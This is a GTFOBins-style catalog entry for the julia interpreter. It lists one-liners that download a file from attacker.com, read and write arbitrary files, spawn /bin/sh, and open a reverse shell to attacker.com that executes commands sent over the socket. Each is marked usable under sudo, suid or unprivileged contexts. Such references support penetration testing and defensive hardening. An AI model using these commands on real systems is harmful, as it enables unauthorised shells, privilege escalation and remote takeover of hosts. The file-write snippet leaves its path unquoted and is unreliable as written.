---
type: gtfobin
name: julia
platform: Unix
functions: [download, file-read, file-write, reverse-shell, shell]
tags: [gtfobin, unix, lotl]
---

# julia

## download

```bash
julia -e 'download("http://attacker.com/path/to/input-file", "/path/to/output-file")'
```
**Contexts:** sudo, suid, unprivileged

## file-read

```bash
julia -e 'print(open(f->read(f, String), "/path/to/input-file"))'
```
**Contexts:** sudo, suid, unprivileged

## file-write

```bash
julia -e 'open(f->write(f, "DATA"), /path/to/output-file, "w")'
```
**Contexts:** sudo, suid, unprivileged

## reverse-shell

```bash
julia -e 'using Sockets; sock=connect("attacker.com", parse(Int64, 12345)); while true; cmd = readline(sock); if !isempty(cmd); cmd = split(cmd); ioo = IOBuffer(); ioe = IOBuffer(); run(pipeline(`$cmd`, stdout=ioo, stderr=ioe)); write(sock, String(take!(ioo)) * String(take!(ioe))); end; end;'
```
**Contexts:** sudo, suid, unprivileged

## shell

```bash
julia -e 'run(`/bin/sh`)'
```
**Contexts:** sudo, suid, unprivileged
